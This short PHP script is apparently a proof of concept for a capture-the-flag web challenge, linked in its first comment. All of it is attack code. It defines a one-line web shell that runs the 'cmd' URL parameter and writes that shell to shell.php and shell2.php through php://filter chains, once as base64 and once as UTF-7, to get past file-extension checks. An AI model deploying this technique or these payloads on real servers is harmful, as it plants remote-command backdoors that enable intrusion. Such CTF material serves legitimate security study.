<?php

# https://github.com/splitline/My-CTF-Challenges/tree/master/ais3-eof/2020-quals/Web/what-the-file

$WEB_SHELL='<?= `${_GET["cmd"]}` ?>';


$filename = "php://filter/write=convert.base64-decode/resource=shell.php";
#$filename = "php://filter/write=convert.base64-decode/resource=shell.php//////."; 
$content = "PD89IGAke19HRVRbImNtZCJdfWAgPz4K";

$extension = pathinfo($filename, PATHINFO_EXTENSION);
echo "extension: $extension";

file_put_contents($filename, $content);

/*
 iconv -t utf-7 -f utf-8 <<< '<?= `${_GET["cmd"]}` ?>';
*/

$filename = "php://filter/write=convert.iconv.utf-7.utf-8/resource=shell2.php/."; 
$content = "+ADw?+AD0 +AGAAJAB7AF8-GET+AFsAIg-cmd+ACIAXQB9AGA ?+AD4";
file_put_contents($filename, $content);
?>
